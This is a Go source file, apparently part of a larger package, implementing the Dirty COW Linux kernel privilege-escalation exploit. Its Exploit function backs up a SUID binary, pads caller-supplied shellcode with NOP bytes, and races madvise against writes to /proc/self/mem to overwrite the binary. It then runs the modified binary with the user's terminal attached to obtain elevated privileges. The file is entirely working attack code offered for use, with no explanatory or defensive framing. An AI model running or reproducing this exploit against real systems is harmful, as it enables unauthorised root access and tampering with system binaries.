package dirtycow

import "errors"
import "os"
import "os/exec"
import "syscall"

var mmap uintptr
var signals = make(chan bool, 2)
var backup_name string

func init() {
	backup_name = "/tmp/dirtycow_backup"
}

func Exploit(suid_binary string, shellcode []byte) (bool, error) {

	var result bool = false

	cmd1 := exec.Command("cp", suid_binary, backup_name)
	err1 := cmd1.Run()

	if err1 == nil {

		file, err2 := os.OpenFile(suid_binary, os.O_RDONLY, 0600)

		if err2 == nil {

			stat, err3 := file.Stat()

			if err3 == nil {

				size := stat.Size()

				if int(size) > len(shellcode) {

					payload := make([]byte, size)

					for p := 0; p < len(payload); p++ {
						payload[p] = 0x90 // noop
					}

					for s := 0; s < len(shellcode); s++ {
						payload[s] = shellcode[s]
					}

					mmap, _, _ := syscall.Syscall6(
						syscall.SYS_MMAP,
						uintptr(0),
						uintptr(size),
						uintptr(syscall.PROT_READ),
						uintptr(syscall.MAP_PRIVATE),
						file.Fd(),
						0,
					)

					go madvise_thread(mmap)
					go write_payload("/proc/self/mem", payload)

					check := await_payload(suid_binary, shellcode)

					if check == true {

						attr := os.ProcAttr{
							Files: []*os.File{
								os.Stdin,
								os.Stdout,
								os.Stderr,
							},
						}

						proc, err4 := os.StartProcess(suid_binary, nil, &attr)

						if err4 == nil {

							proc.Wait()

							return true, nil

						} else {
							return false, err4
						}

					} else {
						return false, errors.New("Dirtycow failed to exploit kernel")
					}

				} else {
					return false, errors.New("Dirtycow requires larger SUID binary for this shellcode to run")
				}

			} else {
				return result, err3
			}

		} else {
			return result, err2
		}

	} else {
		return result, err1
	}

	return result, nil

}
